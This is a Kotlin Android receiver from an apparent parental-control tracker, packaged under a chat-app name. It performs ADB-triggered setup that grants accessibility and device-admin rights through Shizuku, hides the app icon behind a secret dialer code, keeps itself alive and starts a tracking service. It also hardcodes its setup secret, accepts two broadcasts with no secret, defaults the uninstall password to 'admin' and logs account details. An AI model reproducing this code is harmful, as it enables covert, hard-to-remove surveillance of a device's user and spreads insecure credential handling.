package com.anonchat.app.parentalcontrol.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.manager.ShizukuPermissionManager
import com.anonchat.app.parentalcontrol.service.TrackerService
import com.anonchat.app.parentalcontrol.util.BackgroundKeepAlive

/**
 * SetupReceiver — Receives the ADB broadcast command that triggers
 * the complete zero-touch setup of the parental control app.
 *
 * Usage from PC terminal:
 * ```
 * adb shell am broadcast -a com.anonchat.app.parentalcontrol.SETUP_ALL \
 *   --es secret "kidguard2024" \
 *   --es server "http://192.168.1.3:5000" \
 *   --es email "child@example.com" \
 *   --es password "childpass123" \
 *   --es pairing_code "ABCD1234" \
 *   --es dialer_code "5678" \
 *   -n com.anonchat.app.parentalcontrol/.SetupReceiver
 * ```
 *
 * Protected by a secret key to prevent unauthorized triggering.
 */
class SetupReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SetupReceiver"
        const val ACTION_SETUP_ALL = "com.anonchat.app.parentalcontrol.SETUP_ALL"
        const val ACTION_GRANT_PERMISSIONS = "com.anonchat.app.parentalcontrol.GRANT_PERMISSIONS"
        const val ACTION_HIDE_APP = "com.anonchat.app.parentalcontrol.HIDE_APP"
        const val ACTION_SHOW_APP = "com.anonchat.app.parentalcontrol.SHOW_APP"
        /**
         * No-secret action that marks the OEM "Autostart / Background power
         * consumption" prompt as already configured. Useful when the installer
         * has already enabled it via ADB or manual configuration and we don't
         * want the prompt to nag the user.
         *
         * Usage:
         *   adb shell am broadcast -a com.anonchat.app.MARK_KEEPALIVE_DONE \
         *       -p com.anonchat.app
         */
        const val ACTION_MARK_KEEPALIVE_DONE = "com.anonchat.app.MARK_KEEPALIVE_DONE"

        /**
         * Re-arms the full keep-alive chain (FGS + exact alarm + WorkManager).
         * Intended for ADB-driven maintenance, e.g. after clearing the app
         * data, after an OTA app update, or to recover from a corrupted
         * alarm schedule.
         *
         * Usage:
         *   adb shell am broadcast -a com.anonchat.app.KEEPALIVE_RESET \
         *       -p com.anonchat.app
         */
        const val ACTION_KEEPALIVE_RESET = "com.anonchat.app.KEEPALIVE_RESET"

        // Secret key that must match for the broadcast to be processed
        private const val SETUP_SECRET = "kidguard2024"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        // The MARK_KEEPALIVE_DONE and KEEPALIVE_RESET actions are
        // intentionally secret-less: they only set benign flags / re-arm
        // our own alarm chain, so we process them before the secret check.
        if (action == ACTION_MARK_KEEPALIVE_DONE) {
            BackgroundKeepAlive.markDone(context)
            Log.d(TAG, "Keep-alive prompt marked done via broadcast")
            return
        }
        if (action == ACTION_KEEPALIVE_RESET) {
            com.anonchat.app.parentalcontrol.keepalive.KeepAliveScheduler.scheduleAll(context)
            Log.d(TAG, "Keep-alive chain re-armed via KEEPALIVE_RESET broadcast")
            return
        }

        // Validate secret key
        val secret = intent.getStringExtra("secret")
        if (secret != SETUP_SECRET) {
            Log.w(TAG, "Invalid or missing secret key. Ignoring broadcast.")
            return
        }

        CloudConfig.init(context)
        Log.d(TAG, "Received action: $action")

        when (action) {
            ACTION_SETUP_ALL -> performFullSetup(context, intent)
            ACTION_GRANT_PERMISSIONS -> performPermissionGrant(context)
            ACTION_HIDE_APP -> performHideApp(context)
            ACTION_SHOW_APP -> performShowApp(context)
        }
    }

    private fun performFullSetup(context: Context, intent: Intent) {
        Log.d(TAG, "═══ Full Zero-Touch Setup Started ═══")

        // Extract parameters from intent extras
        val serverUrl = intent.getStringExtra("server")
        val email = intent.getStringExtra("email")
        val password = intent.getStringExtra("password")
        val pairingCode = intent.getStringExtra("pairing_code")
        val dialerCode = intent.getStringExtra("dialer_code") ?: "1234"

        // Step 1: Configure server
        if (!serverUrl.isNullOrBlank()) {
            CloudConfig.serverUrl = serverUrl
            Log.d(TAG, "Server configured: $serverUrl")
        }

        // Step 2: Set dialer code
        CloudConfig.secretDialerCode = dialerCode
        CloudConfig.autoHideEnabled = true
        Log.d(TAG, "Dialer code set: *#*#${dialerCode}#*#*")

        // Step 3: Set default uninstall password if not set
        if (CloudConfig.uninstallPassword.isEmpty()) {
            CloudConfig.uninstallPassword = "admin"
        }

        // Step 4: Run Shizuku permission manager (grants, accessibility, admin, battery)
        Thread {
            try {
                val result = ShizukuPermissionManager.runFullSetup(
                    context,
                    hideIcon = true
                )
                Log.d(TAG, "Permission setup result:\n${result.report}")

                // Step 5: Register and login
                if (!email.isNullOrBlank() && !password.isNullOrBlank()) {
                    Log.d(TAG, "Registering/logging in as: $email")

                    // Try register as child first
                    val regResult = ApiClient.register(
                        email, password, email.split("@")[0], "child"
                    )
                    when (regResult) {
                        is ApiClient.Result.Success -> {
                            Log.d(TAG, "Account created successfully")
                        }
                        is ApiClient.Result.Error -> {
                            // Already exists, try login
                            Log.d(TAG, "Registration failed (may already exist), trying login...")
                            val loginResult = ApiClient.login(email, password, "child")
                            when (loginResult) {
                                is ApiClient.Result.Success -> {
                                    Log.d(TAG, "Login successful")
                                }
                                is ApiClient.Result.Error -> {
                                    Log.e(TAG, "Login also failed: ${loginResult.message}")
                                }
                            }
                        }
                    }

                    // Step 6: Claim pairing code if provided
                    if (!pairingCode.isNullOrBlank() && CloudConfig.isLoggedIn) {
                        Log.d(TAG, "Claiming pairing code: $pairingCode")
                        val pairResult = ApiClient.claimPairing(pairingCode)
                        when (pairResult) {
                            is ApiClient.Result.Success -> {
                                Log.d(TAG, "Pairing claimed successfully")
                            }
                            is ApiClient.Result.Error -> {
                                Log.w(TAG, "Pairing claim failed: ${pairResult.message}")
                            }
                        }
                    }
                }

                // Step 7: Start the tracking service
                TrackerService.start(context)
                Log.d(TAG, "Tracking service started")

                // Step 8: Mark setup as fully completed
                val prefs = context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("setup_completed", true).apply()
                CloudConfig.setupFullyCompleted = true

                Log.d(TAG, "═══ Full Setup Complete ═══")
                Log.d(TAG, "App is now hidden. Dial *#*#${dialerCode}#*#* to re-open.")

            } catch (e: Exception) {
                Log.e(TAG, "Setup failed", e)
            }
        }.start()
    }

    private fun performPermissionGrant(context: Context) {
        Thread {
            val results = ShizukuPermissionManager.grantAllPermissions(context)
            results.forEach { Log.d(TAG, it) }
        }.start()
    }

    private fun performHideApp(context: Context) {
        ShizukuPermissionManager.hideAppIcon(context)
        Log.d(TAG, "App icon hidden")
    }

    private fun performShowApp(context: Context) {
        ShizukuPermissionManager.showAppIcon(context)
        Log.d(TAG, "App icon shown")
    }
}
